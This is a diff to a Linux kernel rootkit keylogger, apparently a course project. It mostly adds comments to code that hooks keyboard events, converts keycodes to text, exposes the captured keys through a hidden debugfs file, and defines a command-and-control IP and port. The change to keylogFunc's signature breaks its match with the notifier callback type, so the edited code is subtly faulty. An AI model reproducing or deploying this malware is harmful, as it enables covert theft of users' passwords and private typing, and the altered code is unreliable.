@@ -13,16 +13,16 @@
 #include <linux/debugfs.h>
 
 MODULE_LICENSE("GPL");
-#define NOTIFY_OK 0x0001
-#define MAX_KEY_LEN 12
+#define NOTIFY_OK 0x0001 // This tells the kernel that everything is OK.
+#define MAX_KEY_LEN 12 // This is the longest key length in key buffer 
 
 static const char *keys[][2] = {{"\0", "\0"}, {"_ESC_", "_ESC_"}, {"1", "!"}, {"2", "@"},{"3", "#"}, {"4", "$"}, {"5", "%"}, {"6", "^"},{"7", "&"}, {"8", "*"}, {"9", "("}, {"0", ")"},{"-", "_"}, {"=", "+"}, {"_BACKSPACE_", "_BACKSPACE_"},{"_TAB_", "_TAB_"}, {"q", "Q"}, {"w", "W"}, {"e", "E"}, {"r", "R"},{"t", "T"}, {"y", "Y"}, {"u", "U"}, {"i", "I"},{"o", "O"}, {"p", "P"}, {"[", "{"}, {"]", "}"},{"\n", "\n"}, {"_LCTRL_", "_LCTRL_"}, {"a", "A"}, {"s", "S"},{"d", "D"}, {"f", "F"}, {"g", "G"}, {"h", "H"},{"j", "J"}, {"k", "K"}, {"l", "L"}, {";", ":"},{"'", "\""}, {"`", "~"}, {"_LSHIFT_", "_LSHIFT_"}, {"\\", "|"},{"z", "Z"}, {"x", "X"}, {"c", "C"}, {"v", "V"},{"b", "B"}, {"n", "N"}, {"m", "M"}, {",", "<"},{".", ">"}, {"/", "?"}, {"_RSHIFT_", "_RSHIFT_"}, {"_PRTSCR_", "_KPD*_"},{"_LALT_", "_LALT_"}, {" ", " "}, {"_CAPS_", "_CAPS_"}, {"F1", "F1"},{"F2", "F2"}, {"F3", "F3"}, {"F4", "F4"}, {"F5", "F5"},{"F6", "F6"}, {"F7", "F7"}, {"F8", "F8"}, {"F9", "F9"},{"F10", "F10"}, {"_NUM_", "_NUM_"}, {"_SCROLL_", "_SCROLL_"},{"_KPD7_", "_HOME_"}, {"_KPD8_", "_UP_"}, {"_KPD9_", "_PGUP_"},{"-", "-"}, {"_KPD4_", "_LEFT_"}, {"_KPD5_", "_KPD5_"},{"_KPD6_", "_RIGHT_"}, {"+", "+"}, {"_KPD1_", "_END_"},{"_KPD2_", "_DOWN_"}, {"_KPD3_", "_PGDN"}, {"_KPD0_", "_INS_"},{"_KPD._", "_DEL_"}, {"_SYSRQ_", "_SYSRQ_"}, {"\0", "\0"},{"\0", "\0"}, {"F11", "F11"}, {"F12", "F12"}, {"\0", "\0"},{"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},{"\0", "\0"}, {"_KPENTER_", "_KPENTER_"}, {"_RCTRL_", "_RCTRL_"}, {"/", "/"},{"_PRTSCR_", "_PRTSCR_"}, {"_RALT_", "_RALT_"}, {"\0", "\0"},{"_HOME_", "_HOME_"}, {"_UP_", "_UP_"}, {"_PGUP_", "_PGUP_"},{"_LEFT_", "_LEFT_"}, {"_RIGHT_", "_RIGHT_"}, {"_END_", "_END_"},{"_DOWN_", "_DOWN_"}, {"_PGDN", "_PGDN"}, {"_INS_", "_INS_"},{"_DEL_", "_DEL_"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},{"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},{"_PAUSE_", "_PAUSE_"}};
 
 static int maxBufSize = 1024;
 static char keysToWrite[1024] = {0};
 static size_t bufSize = 0;
-static struct dentry* file;
-static struct dentry* subdir;
+static struct dentry* file; //File to be written to
+static struct dentry* subdir; // Directory Created to contain the file
 
 static int C2_PORT = 1337;
 static char * C2_IP = "192.168.56.1";
@@ -34,7 +34,7 @@ static enum data_operation {
   RECV = 2
 };
 
-static int keylogFunc(struct notifier_block*, unsigned long, void*);
+static int keylogFunc(struct notifier_block*, void*);
 static ssize_t readKeys(struct file* fp, char* buffer, size_t len, loff_t* offset);
 
 const struct file_operations keyOps = {
@@ -42,6 +42,13 @@ const struct file_operations keyOps = {
   .read = readKeys,
 };
 
+/*
+* readKeys: This function is the read for the file operations, it will read from the device created and write it to the file presented
+* @param struct file* file: The file in user space to be written to
+* @param char* buffer: the buffer that will be written to the files
+* @param size_t len: length of the buffer
+* @param loff_t offset: where to start in the buffer
+*/
 static ssize_t readKeys(struct file* fp, char* buffer, size_t len, loff_t* offset){
   return simple_read_from_buffer(buffer, len, offset, keysToWrite, bufSize);
 }
@@ -50,9 +57,17 @@ static struct notifier_block keylogger = {
     .notifier_call = keylogFunc
 };
 
+/*
+* keycodeToAscii: This will take the given keycode and transform it based off the code and shift 
+* @param int shift: if shift is pressed or not
+* @param int keycode: the code of the key pressed
+* @param char* buffer: the buffer to hold the keys
+*/
 void keycodeToAscii(int shift, int keycode, char* buf){
+    //keep track of the keys to be logged 
     if (keycode > KEY_RESERVED && keycode <= KEY_PAUSE){
       const char* asciiVal;
+      // if the shift is pressed
       if (shift == 1){
         asciiVal = keys[keycode][1];
       } else {
@@ -62,15 +77,25 @@ void keycodeToAscii(int shift, int keycode, char* buf){
     }
 }
 
-int keylogFunc(struct notifier_block *blk, unsigned long code, void *_param){
+/*
+* keylogFunc: This is the function that will be called when a key press event happens. It will transform
+*             key pressed into ASCII 
+* @param: struct notifier_blk blk: The struct that holds the keylogging function
+* @param: void* _param: the struct that holds the keypress
+*/
+int keylogFunc(struct notifier_block *blk, void *_param){
     struct keyboard_notifier_param *param = _param;
     char buf[MAX_KEY_LEN] = {0};
 
+    // Only log on the down press of the key
     if(param->down){
       keycodeToAscii(param->shift,param->value, buf);
       if (strlen(buf) < 1){
+        // Return out if it is an invalid keycode
         return NOTIFY_OK;
       }
+
+      // Reset buffer position before we go out of bounds
       if ((bufSize + strlen(buf)) >= maxBufSize){
         bufSize = 0;
       }
@@ -132,6 +157,8 @@ static int __init rootkit_init(void) {
   addr.sin_port = htons(C2_PORT);
 
   printk(KERN_INFO "Loaded kernel module\n");
+
+  //Create the directory and the file
   subdir = debugfs_create_dir("447", NULL);
   file = debugfs_create_file("kylg", 0400, subdir, NULL, &keyOps);
   register_keyboard_notifier(&keylogger);
